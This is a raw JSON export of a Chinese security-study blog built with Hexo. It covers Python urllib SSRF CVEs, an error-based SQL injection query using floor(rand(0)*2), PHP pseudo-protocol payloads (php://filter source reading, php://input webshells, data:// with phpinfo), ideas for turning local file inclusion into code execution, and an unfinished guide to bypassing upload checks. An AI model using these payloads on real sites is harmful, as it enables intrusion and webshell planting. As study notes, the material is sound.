rel=\"noopener\">http://www.feidao.site/wordpress/?p=2116</a></p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h2 id=\"SSRF在Python中的利用\"><a href=\"#SSRF在Python中的利用\" class=\"headerlink\" title=\"SSRF在Python中的利用\"></a>SSRF在Python中的利用</h2><ul>\n<li>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through  3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大</li>\n<li>除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python  2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。</li>\n</ul>\n<h2 id=\"SSRF在JAVA中的利用\"><a href=\"#SSRF在JAVA中的利用\" class=\"headerlink\" title=\"SSRF在JAVA中的利用\"></a>SSRF在JAVA中的利用</h2><h2 id=\"30x跳转\"><a href=\"#30x跳转\" class=\"headerlink\" title=\"30x跳转\"></a>30x跳转</h2><h2 id=\"URL解析绕过\"><a href=\"#URL解析绕过\" class=\"headerlink\" title=\"URL解析绕过\"></a>URL解析绕过</h2><h2 id=\"DNS-rebinding\"><a href=\"#DNS-rebinding\" class=\"headerlink\" title=\"DNS rebinding\"></a>DNS rebinding</h2><blockquote>\n<p>参考</p>\n<p><a href=\"https://security.tencent.com/index.php/blog/msg/179\" target=\"_blank\" rel=\"noopener\">https://security.tencent.com/index.php/blog/msg/179</a></p>\n</blockquote>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/ssrf.html\" target=\"_blank\" rel=\"noopener\">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/index.html\" target=\"_blank\" rel=\"noopener\">https://websec.readthedocs.io/zh/latest/vuln/index.html</a></p>\n<p><a href=\"https://www.evi1s.com/archives/140/\" target=\"_blank\" rel=\"noopener\">https://www.evi1s.com/archives/140/</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/226240\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/226240</a></p>\n<p><a href=\"http://www.feidao.site/wordpress/?p=2116\" target=\"_blank\" rel=\"noopener\">http://www.feidao.site/wordpress/?p=2116</a></p>\n"},{"title":"报错注入详解","date":"2021-09-10T06:01:12.527Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n## 基于floor()的报错SQL语句\n\n```sql\nselect count(*),(concat(floor(rand(0)*2),(select version())))x from user group by x;\n```\n\n- floor()函数\n\n  floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。\n\n- rand()函数\n\n  rand()函数可以用来生成0-1之间的随机数,但是rand(0)相当于给了rand()函数一个随机种子0,rand()生成的数字是随机的,而rand(0)是有规律的生成\n\n  rand()效果\n\n  ![image-20210524170954639](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524170954639.png)\n\n  rand(0)效果\n\n  ![image-20210524171023410](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524171023410.png)\n\n  利用rand(0)伪随机生成数字是有规律可循的,这也是采用rand(0)进行报错注入的原因,rand(0)是稳定的,而rand()则需要碰运气\n\n- floor(rand(0)*2)\n\n  rand()是返回0-1之间的随机数,则乘2后返回0-2之间的随机数,再配合floor()就可以产生0、1两个确定的数，大概产生的伪随机数序列为011011...\n\n- 报错原理\n\n  > 参考\n  >\n  > https://www.cnblogs.com/litlife/p/8472323.html\n\n","source":"_posts/报错注入详解.md","raw":"---\ntitle: 报错注入详解\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SQL注入\ncategories: SQL注入\n---\n\n## 基于floor()的报错SQL语句\n\n```sql\nselect count(*),(concat(floor(rand(0)*2),(select version())))x from user group by x;\n```\n\n- floor()函数\n\n  floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。\n\n- rand()函数\n\n  rand()函数可以用来生成0-1之间的随机数,但是rand(0)相当于给了rand()函数一个随机种子0,rand()生成的数字是随机的,而rand(0)是有规律的生成\n\n  rand()效果\n\n  ![image-20210524170954639](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524170954639.png)\n\n  rand(0)效果\n\n  ![image-20210524171023410](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524171023410.png)\n\n  利用rand(0)伪随机生成数字是有规律可循的,这也是采用rand(0)进行报错注入的原因,rand(0)是稳定的,而rand()则需要碰运气\n\n- floor(rand(0)*2)\n\n  rand()是返回0-1之间的随机数,则乘2后返回0-2之间的随机数,再配合floor()就可以产生0、1两个确定的数，大概产生的伪随机数序列为011011...\n\n- 报错原理\n\n  > 参考\n  >\n  > https://www.cnblogs.com/litlife/p/8472323.html\n\n","slug":"报错注入详解","published":1,"updated":"2021-07-27T03:42:19.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyec001tt8op5t9b3pww","content":"<h2 id=\"基于floor-的报错SQL语句\"><a href=\"#基于floor-的报错SQL语句\" class=\"headerlink\" title=\"基于floor()的报错SQL语句\"></a>基于floor()的报错SQL语句</h2><pre class=\"line-numbers language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li><p>floor()函数</p>\n<p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>\n</li>\n<li><p>rand()函数</p>\n<p>rand()函数可以用来生成0-1之间的随机数,但是rand(0)相当于给了rand()函数一个随机种子0,rand()生成的数字是随机的,而rand(0)是有规律的生成</p>\n<p>rand()效果</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524170954639.png\" alt=\"image-20210524170954639\"></p>\n<p>rand(0)效果</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524171023410.png\" alt=\"image-20210524171023410\"></p>\n<p>利用rand(0)伪随机生成数字是有规律可循的,这也是采用rand(0)进行报错注入的原因,rand(0)是稳定的,而rand()则需要碰运气</p>\n</li>\n<li><p>floor(rand(0)*2)</p>\n<p>rand()是返回0-1之间的随机数,则乘2后返回0-2之间的随机数,再配合floor()就可以产生0、1两个确定的数，大概产生的伪随机数序列为011011…</p>\n</li>\n<li><p>报错原理</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/litlife/p/8472323.html</a></p>\n</blockquote>\n</li>\n</ul>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h2 id=\"基于floor-的报错SQL语句\"><a href=\"#基于floor-的报错SQL语句\" class=\"headerlink\" title=\"基于floor()的报错SQL语句\"></a>基于floor()的报错SQL语句</h2><pre><code class=\"sql\">select count(*),(concat(floor(rand(0)*2),(select version())))x from user group by x;</code></pre>\n<ul>\n<li><p>floor()函数</p>\n<p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>\n</li>\n<li><p>rand()函数</p>\n<p>rand()函数可以用来生成0-1之间的随机数,但是rand(0)相当于给了rand()函数一个随机种子0,rand()生成的数字是随机的,而rand(0)是有规律的生成</p>\n<p>rand()效果</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524170954639.png\" alt=\"image-20210524170954639\"></p>\n<p>rand(0)效果</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524171023410.png\" alt=\"image-20210524171023410\"></p>\n<p>利用rand(0)伪随机生成数字是有规律可循的,这也是采用rand(0)进行报错注入的原因,rand(0)是稳定的,而rand()则需要碰运气</p>\n</li>\n<li><p>floor(rand(0)*2)</p>\n<p>rand()是返回0-1之间的随机数,则乘2后返回0-2之间的随机数,再配合floor()就可以产生0、1两个确定的数，大概产生的伪随机数序列为011011…</p>\n</li>\n<li><p>报错原理</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/litlife/p/8472323.html</a></p>\n</blockquote>\n</li>\n</ul>\n"},{"title":"php伪协议总结","date":"2021-09-10T06:01:12.061Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# PHP伪协议\n\nphp配置\n\nallow_url_fopen=On\n\nallow_url_include=On\n\n## php://input\n\n可直接获取POST传输的数据\n\n不用键与值的形式，只写代码即可\n\n可以用作命令执行，写一句话木马\n\n## php://filter\n\n常见用法\n\n```php\nphp://filter/read=convert.base64-encode/resource=文件路径\n```\n\n- 非php语法文件include失败，直接输出源码内容\n- php语法文件include成功，直接执行\n\n## file://\n\nfile:// 与php:filter类似，访问本地文件，但是只能传入绝对路径\n\n## phar://\n\n查找指定压缩包内的文件\n\n## zip://\n\n与phar://类似\n\n注意\n\n1. 只能传入绝对路径\n2. 要用#分隔压缩包和压缩包里的内容，#用url编码%23\n\n## data\n\n与input类似\n\n用法\n\n1. 直接写入代码\n\n   ```php\n   data:text/plain,<?php phpinfo();?>\n   ```\n\n2. 使用base64编码\n\n   ```php\n   data:text/plain;base64,编码后的php代码\n   ```\n\n   注意：base64编码后的加号和等号要手动进行url编码，否则无法识别\n\n## 总结\n\n![img](https://gitee.com/h1ler/blogimage/raw/master/img/20180606180044611)\n\n","source":"_posts/php伪协议总结.md","raw":"---\ntitle: php伪协议总结\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: PHP\ncategories: PHP\n---\n\n# PHP伪协议\n\nphp配置\n\nallow_url_fopen=On\n\nallow_url_include=On\n\n## php://input\n\n可直接获取POST传输的数据\n\n不用键与值的形式，只写代码即可\n\n可以用作命令执行，写一句话木马\n\n## php://filter\n\n常见用法\n\n```php\nphp://filter/read=convert.base64-encode/resource=文件路径\n```\n\n- 非php语法文件include失败，直接输出源码内容\n- php语法文件include成功，直接执行\n\n## file://\n\nfile:// 与php:filter类似，访问本地文件，但是只能传入绝对路径\n\n## phar://\n\n查找指定压缩包内的文件\n\n## zip://\n\n与phar://类似\n\n注意\n\n1. 只能传入绝对路径\n2. 要用#分隔压缩包和压缩包里的内容，#用url编码%23\n\n## data\n\n与input类似\n\n用法\n\n1. 直接写入代码\n\n   ```php\n   data:text/plain,<?php phpinfo();?>\n   ```\n\n2. 使用base64编码\n\n   ```php\n   data:text/plain;base64,编码后的php代码\n   ```\n\n   注意：base64编码后的加号和等号要手动进行url编码，否则无法识别\n\n## 总结\n\n![img](https://gitee.com/h1ler/blogimage/raw/master/img/20180606180044611)\n\n","slug":"php伪协议总结","published":1,"updated":"2021-07-27T03:36:21.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyed001wt8op7nvw1il8","content":"<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><p>php配置</p>\n<p>allow_url_fopen=On</p>\n<p>allow_url_include=On</p>\n<h2 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h2><p>可直接获取POST传输的数据</p>\n<p>不用键与值的形式，只写代码即可</p>\n<p>可以用作命令执行，写一句话木马</p>\n<h2 id=\"php-filter\"><a href=\"#php-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h2><p>常见用法</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">php<span class=\"token punctuation\">:</span><span class=\"token comment\" spellcheck=\"true\">//filter/read=convert.base64-encode/resource=文件路径</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>非php语法文件include失败，直接输出源码内容</li>\n<li>php语法文件include成功，直接执行</li>\n</ul>\n<h2 id=\"file\"><a href=\"#file\" class=\"headerlink\" title=\"file://\"></a>file://</h2><p>file:// 与php:filter类似，访问本地文件，但是只能传入绝对路径</p>\n<h2 id=\"phar\"><a href=\"#phar\" class=\"headerlink\" title=\"phar://\"></a>phar://</h2><p>查找指定压缩包内的文件</p>\n<h2 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip://\"></a>zip://</h2><p>与phar://类似</p>\n<p>注意</p>\n<ol>\n<li>只能传入绝对路径</li>\n<li>要用#分隔压缩包和压缩包里的内容，#用url编码%23</li>\n</ol>\n<h2 id=\"data\"><a href=\"#data\" class=\"headerlink\" title=\"data\"></a>data</h2><p>与input类似</p>\n<p>用法</p>\n<ol>\n<li><p>直接写入代码</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">data<span class=\"token punctuation\">:</span>text<span class=\"token operator\">/</span>plain<span class=\"token punctuation\">,</span><span class=\"token delimiter\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>使用base64编码</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">data<span class=\"token punctuation\">:</span>text<span class=\"token operator\">/</span>plain<span class=\"token punctuation\">;</span>base64<span class=\"token punctuation\">,</span>编码后的php代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>注意：base64编码后的加号和等号要手动进行url编码，否则无法识别</p>\n</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20180606180044611\" alt=\"img\"></p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"PHP伪协议\"><a href=\"#PHP伪协议\" class=\"headerlink\" title=\"PHP伪协议\"></a>PHP伪协议</h1><p>php配置</p>\n<p>allow_url_fopen=On</p>\n<p>allow_url_include=On</p>\n<h2 id=\"php-input\"><a href=\"#php-input\" class=\"headerlink\" title=\"php://input\"></a>php://input</h2><p>可直接获取POST传输的数据</p>\n<p>不用键与值的形式，只写代码即可</p>\n<p>可以用作命令执行，写一句话木马</p>\n<h2 id=\"php-filter\"><a href=\"#php-filter\" class=\"headerlink\" title=\"php://filter\"></a>php://filter</h2><p>常见用法</p>\n<pre><code class=\"php\">php://filter/read=convert.base64-encode/resource=文件路径</code></pre>\n<ul>\n<li>非php语法文件include失败，直接输出源码内容</li>\n<li>php语法文件include成功，直接执行</li>\n</ul>\n<h2 id=\"file\"><a href=\"#file\" class=\"headerlink\" title=\"file://\"></a>file://</h2><p>file:// 与php:filter类似，访问本地文件，但是只能传入绝对路径</p>\n<h2 id=\"phar\"><a href=\"#phar\" class=\"headerlink\" title=\"phar://\"></a>phar://</h2><p>查找指定压缩包内的文件</p>\n<h2 id=\"zip\"><a href=\"#zip\" class=\"headerlink\" title=\"zip://\"></a>zip://</h2><p>与phar://类似</p>\n<p>注意</p>\n<ol>\n<li>只能传入绝对路径</li>\n<li>要用#分隔压缩包和压缩包里的内容，#用url编码%23</li>\n</ol>\n<h2 id=\"data\"><a href=\"#data\" class=\"headerlink\" title=\"data\"></a>data</h2><p>与input类似</p>\n<p>用法</p>\n<ol>\n<li><p>直接写入代码</p>\n<pre><code class=\"php\">data:text/plain,&lt;?php phpinfo();?&gt;</code></pre>\n</li>\n<li><p>使用base64编码</p>\n<pre><code class=\"php\">data:text/plain;base64,编码后的php代码</code></pre>\n<p>注意：base64编码后的加号和等号要手动进行url编码，否则无法识别</p>\n</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/20180606180044611\" alt=\"img\"></p>\n"},{"title":"文件包含中的一些问题","date":"2021-09-10T06:01:12.953Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# 文件包含中的一些问题\n\n- PHP中include和require的区别\n\n  参考[PHP中include和require的区别详解](https://blog.csdn.net/shenpengchao/article/details/52326233)\n\n  - include在用到时加载\n  - require在一开始就加载\n  - _once后缀表示已加载的不加载\n  - PHP系统在加载PHP程序时有一个伪编译过程，可使程序运行加快。但include的文档仍为解释执行。include的文件中出错了，主程序继续往下执行，require的文件出错了，主程序也停了，所以包含的文件出错对系统影响不大的话（如界面文件）就用include，否则用require。\n  - require()和include()语句是语言结构，不是真正的函数，可以像PHP中其他的语言结构一样，例如echo()可以使用echo(\"abc\")形式，也可以使用echo \"abc\"形式输出字符串abc。require()和include()语句也可以不加圆括号而直接加参数。\n  - include()执行时需要引用的文件每次都要进行读取和评估，require()执行时需要引用的文件只处理一次（实际上执行时需要引用的文件内容替换了require()语句）可以看出若有包含这些指令之一的代码和可能执行多次的代码，则使用require()效率比较高，若每次执行代码时相读取不同的文件或者有通过一组文件叠代的循环，就使用include()。\n  \n- include(或require)语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用include语句的文件中\n\n  伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行\n\n","source":"_posts/文件包含中的一些问题.md","raw":"---\ntitle: 文件包含中的一些问题\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: 文件包含\ncategories: 文件包含\n---\n\n\n\n# 文件包含中的一些问题\n\n- PHP中include和require的区别\n\n  参考[PHP中include和require的区别详解](https://blog.csdn.net/shenpengchao/article/details/52326233)\n\n  - include在用到时加载\n  - require在一开始就加载\n  - _once后缀表示已加载的不加载\n  - PHP系统在加载PHP程序时有一个伪编译过程，可使程序运行加快。但include的文档仍为解释执行。include的文件中出错了，主程序继续往下执行，require的文件出错了，主程序也停了，所以包含的文件出错对系统影响不大的话（如界面文件）就用include，否则用require。\n  - require()和include()语句是语言结构，不是真正的函数，可以像PHP中其他的语言结构一样，例如echo()可以使用echo(\"abc\")形式，也可以使用echo \"abc\"形式输出字符串abc。require()和include()语句也可以不加圆括号而直接加参数。\n  - include()执行时需要引用的文件每次都要进行读取和评估，require()执行时需要引用的文件只处理一次（实际上执行时需要引用的文件内容替换了require()语句）可以看出若有包含这些指令之一的代码和可能执行多次的代码，则使用require()效率比较高，若每次执行代码时相读取不同的文件或者有通过一组文件叠代的循环，就使用include()。\n  \n- include(或require)语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用include语句的文件中\n\n  伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行\n\n","slug":"文件包含中的一些问题","published":1,"updated":"2021-07-27T03:25:55.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyef0021t8op7j7h13mv","content":"<h1 id=\"文件包含中的一些问题\"><a href=\"#文件包含中的一些问题\" class=\"headerlink\" title=\"文件包含中的一些问题\"></a>文件包含中的一些问题</h1><ul>\n<li><p>PHP中include和require的区别</p>\n<p>参考<a href=\"https://blog.csdn.net/shenpengchao/article/details/52326233\" target=\"_blank\" rel=\"noopener\">PHP中include和require的区别详解</a></p>\n<ul>\n<li>include在用到时加载</li>\n<li>require在一开始就加载</li>\n<li>_once后缀表示已加载的不加载</li>\n<li>PHP系统在加载PHP程序时有一个伪编译过程，可使程序运行加快。但include的文档仍为解释执行。include的文件中出错了，主程序继续往下执行，require的文件出错了，主程序也停了，所以包含的文件出错对系统影响不大的话（如界面文件）就用include，否则用require。</li>\n<li>require()和include()语句是语言结构，不是真正的函数，可以像PHP中其他的语言结构一样，例如echo()可以使用echo(“abc”)形式，也可以使用echo “abc”形式输出字符串abc。require()和include()语句也可以不加圆括号而直接加参数。</li>\n<li>include()执行时需要引用的文件每次都要进行读取和评估，require()执行时需要引用的文件只处理一次（实际上执行时需要引用的文件内容替换了require()语句）可以看出若有包含这些指令之一的代码和可能执行多次的代码，则使用require()效率比较高，若每次执行代码时相读取不同的文件或者有通过一组文件叠代的循环，就使用include()。</li>\n</ul>\n</li>\n<li><p>include(或require)语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用include语句的文件中</p>\n<p>伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行</p>\n</li>\n</ul>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"文件包含中的一些问题\"><a href=\"#文件包含中的一些问题\" class=\"headerlink\" title=\"文件包含中的一些问题\"></a>文件包含中的一些问题</h1><ul>\n<li><p>PHP中include和require的区别</p>\n<p>参考<a href=\"https://blog.csdn.net/shenpengchao/article/details/52326233\" target=\"_blank\" rel=\"noopener\">PHP中include和require的区别详解</a></p>\n<ul>\n<li>include在用到时加载</li>\n<li>require在一开始就加载</li>\n<li>_once后缀表示已加载的不加载</li>\n<li>PHP系统在加载PHP程序时有一个伪编译过程，可使程序运行加快。但include的文档仍为解释执行。include的文件中出错了，主程序继续往下执行，require的文件出错了，主程序也停了，所以包含的文件出错对系统影响不大的话（如界面文件）就用include，否则用require。</li>\n<li>require()和include()语句是语言结构，不是真正的函数，可以像PHP中其他的语言结构一样，例如echo()可以使用echo(“abc”)形式，也可以使用echo “abc”形式输出字符串abc。require()和include()语句也可以不加圆括号而直接加参数。</li>\n<li>include()执行时需要引用的文件每次都要进行读取和评估，require()执行时需要引用的文件只处理一次（实际上执行时需要引用的文件内容替换了require()语句）可以看出若有包含这些指令之一的代码和可能执行多次的代码，则使用require()效率比较高，若每次执行代码时相读取不同的文件或者有通过一组文件叠代的循环，就使用include()。</li>\n</ul>\n</li>\n<li><p>include(或require)语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用include语句的文件中</p>\n<p>伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当做php文件执行</p>\n</li>\n</ul>\n"},{"title":"文件包含总结","date":"2021-09-10T06:01:13.109Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# 本地包含漏洞执行任意代码思路\n\n- /proc/self/environ\n- 包含web server日志文件\n- php_error文件内容\n- 包含其他日志文件\n- FTP日志文件内容\n- 结合phpinfo包含临时文件\n- 利用工具中的php临时文件\n- 包含session文件\n\n待完善\n\n\n\n","source":"_posts/文件包含总结.md","raw":"---\ntitle: 文件包含总结\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: 文件包含\ncategories: 文件包含\n---\n\n\n\n# 本地包含漏洞执行任意代码思路\n\n- /proc/self/environ\n- 包含web server日志文件\n- php_error文件内容\n- 包含其他日志文件\n- FTP日志文件内容\n- 结合phpinfo包含临时文件\n- 利用工具中的php临时文件\n- 包含session文件\n\n待完善\n\n\n\n","slug":"文件包含总结","published":1,"updated":"2021-07-27T03:42:07.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyeh0024t8ophfwb6efb","content":"<h1 id=\"本地包含漏洞执行任意代码思路\"><a href=\"#本地包含漏洞执行任意代码思路\" class=\"headerlink\" title=\"本地包含漏洞执行任意代码思路\"></a>本地包含漏洞执行任意代码思路</h1><ul>\n<li>/proc/self/environ</li>\n<li>包含web server日志文件</li>\n<li>php_error文件内容</li>\n<li>包含其他日志文件</li>\n<li>FTP日志文件内容</li>\n<li>结合phpinfo包含临时文件</li>\n<li>利用工具中的php临时文件</li>\n<li>包含session文件</li>\n</ul>\n<p>待完善</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"本地包含漏洞执行任意代码思路\"><a href=\"#本地包含漏洞执行任意代码思路\" class=\"headerlink\" title=\"本地包含漏洞执行任意代码思路\"></a>本地包含漏洞执行任意代码思路</h1><ul>\n<li>/proc/self/environ</li>\n<li>包含web server日志文件</li>\n<li>php_error文件内容</li>\n<li>包含其他日志文件</li>\n<li>FTP日志文件内容</li>\n<li>结合phpinfo包含临时文件</li>\n<li>利用工具中的php临时文件</li>\n<li>包含session文件</li>\n</ul>\n<p>待完善</p>\n"},{"title":"文件上传","date":"2021-09-10T06:01:12.788Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# 文件上传\n\n## 上传检测流程\n\n![sum_up](https://gitee.com/h1ler/blogimage/raw/master/img/20210425001426.png)\n\n![image-20210420012816046](https://gitee.com/h1ler/blogimage/raw/master/img/20210420012816.png)\n\n## 客户端检测绕过（JS）\n\n- 如何判断是前端验证呢？\n\n  - 抓包监听，如果上传文件的时候还没有抓取到数据包，但浏览器就提示文件类型不正确的话，那么多半就是前端校验了\n\n- 通常解法：\n\n  - 抓包\n\n    - 由于是前端校验，因此可以将shell.png重命名为shell.png 上传抓包时再将文件名修改为shell.php即可绕过前端限制，成功上传webshell。\n  - 禁用JS\n\n  - 因为JS来校验文件后缀的原因，因此直接在浏览器上禁用JS即可。\n\n  - 方法\n\n    - firefox：按**F12**打开调试工具，再按**F1**打开设置选项![image-20210415224247926](https://gitee.com/h1ler/blogimage/raw/master/img/20210415224321.png)\n      - 